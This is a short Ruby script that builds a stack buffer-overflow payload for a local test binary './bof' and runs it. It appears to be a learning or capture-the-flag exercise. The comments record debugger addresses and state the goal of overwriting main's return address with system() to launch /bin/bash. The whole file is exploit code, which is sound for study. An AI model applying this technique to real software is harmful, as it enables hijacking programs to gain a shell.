#!/usr/bin/ruby

=begin
Create exploit string

Information:
&buf = (char (*)[300]) 0x7fffffffdde0
rbp            0x7fffffffdf10
0x0000000000400694 <+135>:       lea    -0x130(%rbp),%rax => 0x7fffffffddd0 => set "/bin/bash"
0x7fffffffdf50:       0x0000000000400520 <= return addr from main Here, we want to write address of system()
0x7fffffffdf40:0x20 0x05 0x40 0x00 0x00 0x00 0x00 0x00
system = 0x4004e0
=end

buf = ""
buf += 'A' * 303
buf += ["00"].pack("H")
#buf += 'A' * 1
#buf += ["e00440"].pack("H*")
#buf += ["c55ea3f7ff7f"].pack("H*") #=> normal return addr
File.open("buf", "wb") do |file|
  file.write(buf)
end

#
# fork explot process!!
#
pid = fork do
  exec("./bof `cat buf`")
end

exitpid, status = *Process.waitpid2(pid)
